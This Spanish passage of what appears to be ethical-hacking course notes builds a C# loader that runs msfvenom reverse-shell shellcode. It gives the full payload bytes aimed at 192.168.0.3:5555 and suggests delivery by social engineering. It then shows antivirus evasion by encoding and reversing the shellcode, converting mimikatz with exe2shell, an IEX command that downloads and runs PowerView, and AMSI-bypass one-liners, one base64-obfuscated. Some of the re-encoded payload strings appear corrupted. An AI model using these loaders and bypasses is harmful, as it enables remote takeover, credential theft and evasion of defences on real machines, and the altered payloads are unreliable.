        static extern IntPtr CreateThread(IntPtr lpThreadAttibutes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]

        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


    }


}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Luego debajo del codigo anterior debajo especificamente del ultimo estatic extern, colocaremos la secuencia donde colocaremos nuestro payload

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 static void Main (string[] args)
 {



 }

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vamos a kali y genreamos nuestro payload pero en formato para c#

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msfvenom --platform windows -p windows/shell/reverse_tcp lhost=192.168.0.3 lport=5555 -f csharp  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Nos arrojara con todo y nombre , la variable llamada buf

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
byte[] buf = new byte[354] {0xfc,0xe8,0x8f,0x00,0x00,0x00,
0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
0x8b,0x52,0x14,0x31,0xff,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,
0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,
0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x8b,0x42,0x3c,
0x57,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,
0x8b,0x58,0x20,0x50,0x8b,0x48,0x18,0x01,0xd3,0x85,0xc9,0x74,
0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xac,
0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,
0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,
0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,
0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,
0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,
0x6a,0x0a,0x68,0xc0,0xa8,0x00,0x03,0x68,0x02,0x00,0x15,0xb3,
0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,
0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,
0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,
0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,
0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,
0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,
0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,
0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,
0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,
0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,
0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,
0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,
0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5
};
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


El cual colocaremos dentro del codigo anterior.


Luego bajo el codigo 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Console.WriteLine();
Console.ForegroundColor = ConsoleColor.Gray;
Console.WriteLine("Iniciando proceso");
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para saber si se ejecuto de manera adecuada, recordad que todo va en orden como les he mostrado y deben de estar dentro de los corchetes


Luego crear la memoria que hablamos al principio para colocar nuestropayload desde la raiz de la memoria

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
IntPtr funcAdrr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
Marshal.Copy(buf, 0, funcAdrr, buf.Length);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

0x1000 el espacio 0x3000 la direccion del inicio 0x40 el permiso, marshal para que copie nuestro codigo de csharp con su tamano length


Luego el codigo para ejecutar 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAdrr, IntPtr.Zero, 0, IntPtr.Zero);
WaitForSingleObject(hThread, 0xffffffff);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Un dato, tengan en cuenta aparte de los cochertes, los punto y comas, las minusculas y mayusculas en la misma variable ya que se llaman entre si y el mas minimo cambio la convertira en otra.

Disculpen si no les explico en detalle todo el codigo lo pueden buscar mas informacion detallada de cada codigo en individual ya que alargaria el tema y se pudiese perder un poco el contexto de lo que se realiza, ademas que algunas palabras como hThread son de mi parte y le pueden colocar otros nombres, solo investigar no solo este simple codigo pueden mejorarlo y crecer compartiendolos.


Por ultimo ctrl+B o la opcion de compiliar compilar testshell o generar dependiendo la verison que tengan.

testshell es el nombre del proyecto para que no haya confusion.

Si todo salio bien deben de ver este mensaje 


colocamos de nuevo exploit en kali y abrimos el archivo testshell en la maquina windows y estaremos dentro, ahora haremos la prueba ya sea con ingenieria social o enviar directamente a la maquina el archivo para confirmar si el antivirus o firewall lo detecta.

En mi caso fui mas alla y lleve el archivo a mi sistema principal , windows 10, no lo borro , no lo detecto pero si evita abrirlo y preguntaran porque, sencillo , el payload que convertimos en codigo csharp no lo codificamos y al codigo en c# fue sencillo no lo ucultamos con otros codigos o lo hicimos mas complejos si lo detecta pero otros antivirus no al igual que otras maquinas no actualizadas, lo pueden probrar el archivo testshell en otras maquinas y otros sistemas de seguridad como la maquina victima, en el siguiente video veremos el mismo codigo pero mas complejo.

Video 95

En esta parte lo que haremos es convertir nuestro codigo de c# que obtuvismo del payload generado y lo convertiremos en string

Copiaremos todo el codigo en kali y lo pasaremos en emacs

Luego de esto sin los corchetes ejecutamos alt+x, luego replace-string enter y luego 0x enter *
esto remplazara 0x del codigo por x

Hacemos lo mismo para las comas (,) por nada solo enter

Luego de esto creamos una macro con ctrl + x luego (, luego de esto estando al comienzo del codigo colocamos el raton en la ultima lina de la primera fila, luego bajamos, luego en la segunda fila nos colocamos al principio y borramos el salto de linea, ya con esto cerramos la macro con ctrl + x luego ), solo seria ctrl + e luego delete.

Poner todo el codigo dentro de doble comilla

Luego de esto pasar al codigo de visual studio en la maquina de windows

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
string payload = "fc*e8*8f*00*00*00*60*31*d2*89*e5*64*8b*52*30*8b*52*0c*52*14*31*ff*8b*72*28*0f*b7*4a*26*c0*ac*3c*61*7c*02*2c*20*c1*cf*0d*c7*49*75*ef*52*8b*52*10*8b*42*3c*01*d0*8b*40*78*85*c0*74*4c*01*d0*8b*58*20*8b*48*18*01*d3*85*c9*74*31*ff*49*8b*34*8b*01*d6*31*c0*ac*cf*0d*01*c7*38*e0*75*f4*03*7d*f8*7d*24*75*e0*58*8b*58*24*01*d3*66*0c*4b*8b*58*1c*01*d3*8b*04*8b*01*89*44*24*24*5b*5b*61*59*5a*51*ff*58*5f*5a*8b*12*e9*80*ff*ff*ff*5d*33*32*00*00*68*77*73*32*5f*54*68*77*26*07*89*e8*ff*d0*b8*90*01*00*29*c4*54*50*68*29*80*6b*00*ff*d5*0a*68*c0*a8*00*03*68*02*00*15*b3*e6*50*50*50*50*40*50*40*50*68*ea*df*e0*ff*d5*97*6a*10*56*57*68*99*74*61*ff*d5*85*c0*74*0a*ff*4e*08*ec*e8*67*00*00*00*6a*00*6a*04*56*68*02*d9*c8*5f*ff*d5*83*f8*00*7e*8b*36*6a*40*68*00*10*00*00*56*6a*68*58*a4*53*e5*ff*d5*93*53*6a*00*53*57*68*02*d9*c8*5f*ff*d5*83*f8*7d*28*58*68*00*40*00*00*6a*00*50*0b*2f*0f*30*ff*d5*57*68*75*6e*4d*ff*d5*5e*5e*ff*0c*24*0f*85*70*ff*ff*e9*9b*ff*ff*ff*01*c3*29*c6*75*c1*c3*bb*f0*b5*a2*56*6a*00*53*ff*d5";

string[] temp_payload = payload.Split('*');

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Aqui colocaremos nuestro payload en el array temp_payload partiendolo desde  * para que lo lea como string

Luego convertir nuestro string luego que este dentro de la memoria en el proceso en byte

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
byte[] payload_final = new byte[temp_payload.Length];

for (int i = 0; i < temp_payload.Length; i++)

{
    payload_final[i] = Convert.ToByte(temp_payload[i], 16);
}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Cambiar la linea de marshal

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Marshal.Copy(payload_final, 0, funcAdrr, payload_final.Length);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Luego de esto precionamos reecompilar solucion

Tendremos nuestro .exe actualizado



Ahora si probad , lo pueden arrastrar a su maquina host y la maquina de windows victima y el firewall o antivirus no lo detectara

Debe de quedar asi

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace WIn32

{

    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]

        static extern IntPtr CreateThread(IntPtr lpThreadAttibutes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]

        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main (string[] args)
        {
            string payload = "fc*e8*8f*00*00*00*60*31*d2*89*e5*64*8b*52*30*8b*52*0c*52*14*8b*72*28*0f*b7*4a*26*31*ff*c0*ac*3c*61*7c*02*2c*20*c1*cf*0d*c7*49*75*ef*52*57*8b*52*10*8b*42*01*d0*8b*40*78*85*c0*74*4c*01*d0*48*18*8b*58*20*50*01*d3*85*c9*74*31*ff*49*8b*34*8b*01*d6*31*c0*ac*cf*0d*01*c7*38*e0*75*f4*03*7d*f8*7d*24*75*e0*58*8b*58*24*01*d3*66*0c*4b*8b*58*1c*01*d3*8b*04*8b*01*89*44*24*24*5b*5b*61*59*5a*51*ff*58*5f*5a*8b*12*e9*80*ff*ff*ff*5d*33*32*00*00*68*77*73*32*5f*54*68*77*26*07*89*e8*ff*d0*b8*90*01*00*29*c4*54*50*68*29*80*6b*00*ff*d5*0a*68*c0*a8*00*03*68*02*00*15*b3*e6*50*50*50*50*40*50*40*50*68*ea*df*e0*ff*d5*97*6a*10*56*57*68*99*74*61*ff*d5*85*c0*74*0a*ff*4e*08*ec*e8*67*00*00*00*6a*00*6a*04*56*68*02*d9*c8*5f*ff*d5*83*f8*00*7e*8b*36*6a*40*68*00*10*00*00*56*6a*68*58*a4*53*e5*ff*d5*93*53*6a*00*53*57*68*02*d9*c8*5f*ff*d5*83*f8*7d*28*58*68*00*40*00*00*6a*00*50*0b*2f*0f*30*ff*d5*57*68*75*6e*4d*ff*d5*5e*5e*ff*0c*24*0f*85*70*ff*ff*e9*9b*ff*ff*ff*01*c3*29*c6*75*c3*bb*f0*b5*a2*56*6a*00*53*ff*d5";

            string[] temp_payload = payload.Split('*');

            byte[] payload_final = new byte[temp_payload.Length];

            for (int i = 0; i < temp_payload.Length; i++)

            {
                payload_final[i] = Convert.ToByte(temp_payload[i], 16);
            }

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Iniciando proceso");

            IntPtr funcAdrr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(payload_final, 0, funcAdrr, payload_final.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAdrr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xffffffff);


        }


    }


}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


O una parte mejorada de mi parte como tambien pueden hacer la suya


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
using System;
using System.Runtime.InteropServices;

namespace Win32
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint INFINITE = 0xFFFFFFFF;

        static void Main(string[] args)
        {
            string payload = "fc*e8*8f*00*00*00*60*31*d2*89*e5*64*8b*52*30*8b*52*0c*8b*52*14...";
            string[] temp_payload = payload.Trim('*').Split('*');

            byte[] payload_final = new byte[temp_payload.Length];
            try
            {
                for (int i = 0; i < temp_payload.Length; i++)
                {
                    payload_final[i] = Convert.ToByte(temp_payload[i], 16);
                }
            }
            catch (FormatException ex)
            {
                Console.WriteLine($"Error al convertir el payload: {ex.Message}");
                return;
            }

            IntPtr funcAdrr = VirtualAlloc(IntPtr.Zero, (uint)payload_final.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (funcAdrr == IntPtr.Zero)
            {
                Console.WriteLine("Error al asignar memoria.");
                return;
            }

            Marshal.Copy(payload_final, 0, funcAdrr, payload_final.Length);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAdrr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("Error al crear el hilo.");
                return;
            }

            WaitForSingleObject(hThread, INFINITE);
        }
    }
}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


codigo con el payload en formato original 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
using System;
using System.Runtime.InteropServices;

namespace PayloadExecution
{
    class Program
    {
        // Importar VirtualAlloc de kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // Importar CreateThread de kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        // Importar WaitForSingleObject de kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // Constantes para VirtualAlloc
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            // Payload generado con msfvenom
            byte[] buf = new byte[354] {0xfc,0xe8,0x8f,0x00,0x00,0x00,
0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
0x8b,0x52,0x14,0x8b,0x72,0x28,0x31,0xff,0x0f,0xb7,0x4a,0x26,
0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,
0x01,0xc7,0x49,0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,
0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,
0x8b,0x48,0x18,0x8b,0x58,0x20,0x50,0x01,0xd3,0x85,0xc9,0x74,
0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,
0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,
0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,
0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,
0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,
0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,
0x6a,0x0a,0x68,0xc0,0xa8,0x00,0x03,0x68,0x02,0x00,0x15,0xb3,
0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,
0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,
0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,
0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,
0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,
0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,
0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,
0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,
0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,
0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,
0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,
0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,
0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5
};


            // Reservar memoria para el payload
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // Copiar el payload a la memoria asignada
            Marshal.Copy(buf, 0, addr, buf.Length);

            // Crear un nuevo hilo para ejecutar el payload
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out uint threadId);

            // Esperar a que el hilo termine
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


con este ultimo si lo detecta el antiviruos ya que no oculata como tal vino el payload

En mi caso no me funciono con el payload modificado, kali no lo escucho quizas sea por el codigo o que el payload se corrumpio, pueden probrar con mas metdos que no sean multi handler en metasploit para codigos y exploit que son de evasion

Video 96

Otra forma de evadir seria simplemente editando el codigo para ocultar mas el payload, en nuestro casosolo dividimos con split entre * luego pasarlo a byte y luego lanzarlo puedeexisten muschas maneraslas cuales pueden estudiar y continuar practicando.

En esta ocacion veremos como evadir con el payload original eliminando unicamente los saltos de linea y enviarlo a una pagina, que se denomina:

yupana engineering online reverse

Esto le daria la vuelta al payload solamente seria crear el codigo que vimos anteiror para el buf de byte y una linea de codigo que lo coloque otra vuelta para que cuando se lanza este se pueda detectar por conexion con kali


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
using System;
using System.Runtime.InteropServices;

namespace PayloadExecution
{
    class Program
    {
        // Importar VirtualAlloc de kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // Importar CreateThread de kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        // Importar WaitForSingleObject de kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // Constantes para VirtualAlloc
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            // Payload invertido
            byte[] reverseByteArray = new byte[327]
            {
                0xd5, 0xff, 0x53, 0x00, 0x6a, 0x56, 0xa2, 0xb5, 0xf0, 0xbb, 0xc3, 0x75, 0xc6, 0x29, 0xc3, 0x01, 0xff, 0xff, 0xff, 0x9b, 0xe9, 0xff, 0xff, 0x70, 0x85, 0x0f, 0x24, 0x0c, 0xff, 0x5e, 0x5e, 0xd5, 0xff, 0x4d, 0x6e, 0x75, 0x68, 0x57, 0xd5, 0xff, 0x30, 0x0f, 0x2f, 0x0b, 0x50, 0x00, 0x6a, 0x00, 0x00, 0x40, 0x00, 0x68, 0x58, 0x28, 0x7d, 0xf8, 0x83, 0xd5, 0xff, 0x5f, 0xc8, 0xd9, 0x02, 0x68, 0x57, 0x53, 0x00, 0x6a, 0x53, 0x93, 0xd5, 0xff, 0xe5, 0x53, 0xa4, 0x58, 0x68, 0x6a, 0x56, 0x00, 0x00, 0x10, 0x00, 0x68, 0x40, 0x6a, 0x36, 0x8b, 0x7e, 0x00, 0xf8, 0x83, 0xd5, 0xff, 0x5f, 0xc8, 0xd9, 0x02, 0x68, 0x56, 0x04, 0x6a, 0x00, 0x6a, 0x00, 0x00, 0x00, 0x67, 0xe8, 0xec, 0x08, 0x4e, 0xff, 0x0a, 0x74, 0xc0, 0x85, 0xd5, 0xff, 0x61, 0x74, 0x99, 0x68, 0x57, 0x56, 0x10, 0x6a, 0x97, 0xd5, 0xff, 0xe0, 0xdf, 0xea, 0x68, 0x50, 0x40, 0x50, 0x40, 0x50, 0x50, 0x50, 0x50, 0xe6, 0xb3, 0x15, 0x00, 0x02, 0x68, 0x03, 0x00, 0xa8, 0xc0, 0x68, 0x0a, 0xd5, 0xff, 0x00, 0x6b, 0x80, 0x29, 0x68, 0x50, 0x54, 0xc4, 0x29, 0x00, 0x01, 0x90, 0xb8, 0xd0, 0xff, 0xe8, 0x89, 0x07, 0x26, 0x77, 0x68, 0x54, 0x5f, 0x32, 0x73, 0x77, 0x68, 0x00, 0x00, 0x32, 0x33, 0x5d, 0xff, 0xff, 0xff, 0x80, 0xe9, 0x12, 0x8b, 0x5a, 0x5f, 0x58, 0xff, 0x51, 0x5a, 0x59, 0x61, 0x5b, 0x5b, 0x24, 0x24, 0x44, 0x89, 0x01, 0x8b, 0x04, 0x8b, 0xd3, 0x01, 0x1c, 0x58, 0x8b, 0x4b, 0x0c, 0x66, 0xd3, 0x01, 0x24, 0x58, 0x8b, 0x58, 0xe0, 0x75, 0x24, 0x7d, 0xf8, 0x7d, 0x03, 0xf4, 0x75, 0xe0, 0x38, 0xc7, 0x01, 0x0d, 0xcf, 0xac, 0xc0, 0x31, 0xd6, 0x01, 0x8b, 0x34, 0x8b, 0x49, 0xff, 0x31, 0x74, 0xc9, 0x85, 0xd3, 0x01, 0x50, 0x18, 0x48, 0x8b, 0x20, 0x58, 0xd0, 0x01, 0x4c, 0x74, 0xc0, 0x85, 0x78, 0x40, 0x8b, 0xd0, 0x01, 0x3c, 0x42, 0x8b, 0x10, 0x52, 0x8b, 0x52, 0xef, 0x75, 0x49, 0xc7, 0x0d, 0xcf, 0xc1, 0x20, 0x2c, 0x02, 0x7c, 0x61, 0x3c, 0xac, 0xc0, 0x26, 0x4a, 0xb7, 0x0f, 0x28, 0x72, 0x8b, 0xff, 0x31, 0x14, 0x52, 0x8b, 0xe5, 0x89, 0x0c, 0x52, 0x8b, 0x30, 0x52, 0x8b, 0x64, 0xd2, 0x31, 0x60, 0x00, 0x00, 0x00, 0x8f, 0xe8, 0xfc

            };

            // Reservar memoria para el payload
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)reverseByteArray.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("Error al reservar memoria.");
                return;
            }

            // Copiar el payload a la memoria asignada
            Marshal.Copy(reverseByteArray, 0, addr, reverseByteArray.Length);

            // Crear un nuevo hilo para ejecutar el payload
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out uint threadId);

            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("Error al crear el hilo.");
                return;
            }

            // Esperar a que el hilo termine
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otra forma seria usar herramientas para la evasion

busmamos : exe2shell github

Si en adelante visualizan algun cambio de ip se debe a que constanstemente actualizo tanto virtualbox como kali


https://github.com/daVinci13/Exe2shell

Y descargamos el codigo con git clone, es una herramienta basica la que utilizaremos ahora.

Luego de descargar es los siguiente 

python2 exe2shell.py + cualquier payload para explotar maquina victima en este ejemlo con mimikatz.exe

python2 exe2shell.py mimikatz.exe y lo que nos dara sera el mimikatz.exe en codigos bytes es decir que lo podremos inyecta en un ejecutable como anteriormente veiamos,editar la firma y demas y que el firmware no lo detecte .

Otro datos oara saber mas de evasion en c#

ebookbypassingavsbychsarp se encuentra en bypassing av by csharp

Recordar qe lo pueden hacer con el lenuaje que mas se sientan comodo, pero a la vez que mientras mas complejo sea el codigo y el lenguaje mas dificil le sera al firmware de detectar el ataque.

https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp



https://damonmohammadbagher.github.io/Posts/ebookBypassingAVsByCsharpProgramming/index.htm 
                           

Video 96

Ahora usaremos una herramienta para evadir en tiempo de ejecucion, la que hemos usado anteriormente contra la maquina WS01 y WS02 
powersploit , que seria un enlace a powerview, es decir, powerview que usamos antes es unas de las herramientas de powersploit.

luego de ejecutar simplemente powersploit en kali nos mostrara una direccion la cual accederemos y con ls nos mostrara los diferentes modulos de ataques



Pero usaremos el mismo powerview, el cual lo encontraran de la sigiente forma


Ya quizas se habran de imaginar, cambio de firma con c#, hacerlo como anteriormente lo hicimos, vamos a ver.

Primero pasaremos el archivo a la maquina victima , seguiremos con WS02 en mi caso, ustedes podran usar otro windows 10 o maquina del dominio que se creo

Ya saben python2 -m simplehttpserver
y luego el codigo que hemos utilizado bastante en windows para que reciba el paquete, el codigo en kali siempre debe de estar enviando la senal donde esta el archivo, me encuentro en el mismo lugar donde esta powerview



Pero en windows seria otro comando al ya utilizado para recibir pero algo parecido ya veran


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
IEX (New-Object Net.WebClient).DownloadString("http://192.168.0.9:8000/PowerView.ps1")
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Luego de ejecutar veran que el antivuris detecta el scrip segun su base de datos y firmas recolectadas como maliciosa. especificamtente amsi se encarga de detaectar estos scrip.

Ya lo estamos haciendo en tiempo real, vamos a ver varias herramientas como bypass para evadir el firmware.

Buscaran en el repositorio matt graeber amsi bypass

https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/


Lo que esta persona descubrio fue que el apartado amsinitfaled si esta en true no cargaba el analizador de firma y se podia ejecutar sin detectar

Codigo solo y quizas en versioanes antiguas de windows 10 lo pueda apagar el amsi

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Pero que pasa el mismo investigador se percato de que si cigra los comandos y estos se ejecuten en moemoria utilizando bash64 como lo vimos parecido con c#, este se podria ejecutar, ya saben que todo se actualiza y quizas cuando vean este instrutivo de hacking etico este en base de datos de windows y no funcione.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
